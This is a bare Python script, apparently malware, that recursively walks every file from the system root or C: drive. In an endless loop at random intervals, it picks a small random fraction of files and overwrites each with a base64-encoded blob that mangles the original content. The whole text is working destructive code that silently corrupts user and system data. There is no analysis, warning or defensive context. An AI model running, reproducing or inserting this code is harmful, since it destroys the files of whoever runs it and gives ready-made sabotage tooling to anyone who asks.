#!/usr/bin/env python
import os,time,base64,random,hashlib
from sys import platform
r=random.randint

def corrupt(fi):
    f=open(fi,'rb').read()
    open(fi,'wb').write(base64.b64encode(str(hashlib.sha512(str(time.time()+r(1,999999)).encode('utf-8')).hexdigest).encode('utf-8')+f+str(r(1,99999999999999999999)).encode('utf-8')))

def get_dir():
    if platform=='win32':
        path='C:'
    else:
        path='/'
    list_of_files=[]
    for root,dirs,files in os.walk(path):
        for file in files:
            list_of_files.append(os.path.join(root,file))
    for name in list_of_files:
        if r(0,999)<2:
            try:
                corrupt(name)
                print(name)
            except Exception:
                print('Error')


while True:
    get_dir()
    time.sleep(r(1,55))
